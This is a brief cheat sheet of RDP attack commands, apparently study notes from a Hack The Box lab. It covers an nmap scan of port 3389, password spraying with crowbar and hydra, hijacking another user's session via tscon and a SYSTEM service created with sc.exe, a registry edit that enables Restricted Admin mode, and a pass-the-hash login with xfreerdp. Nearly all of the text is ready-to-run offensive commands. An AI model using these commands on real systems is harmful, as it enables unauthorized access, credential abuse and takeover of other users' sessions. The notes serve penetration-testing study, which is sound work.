
nmap scan
```shell-session
nmap -Pn -p3389 192.168.2.143
```


Password spraying tools
https://github.com/galkan/crowbar
```shell-session
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

```shell-session
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

login to via rdp on linux
```shell-session
rdesktop -u admin -p password123 192.168.2.143
```

Impersonating another user (Must have SYSTEM privilege's)
```cmd-session
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Session Hijacking
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create
```cmd-session
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

C:\htb> net start sessionhijack
```

Used when perms are blocking rdp via pass the hash
```cmd-session
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

rdp via pth
```shell-session
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
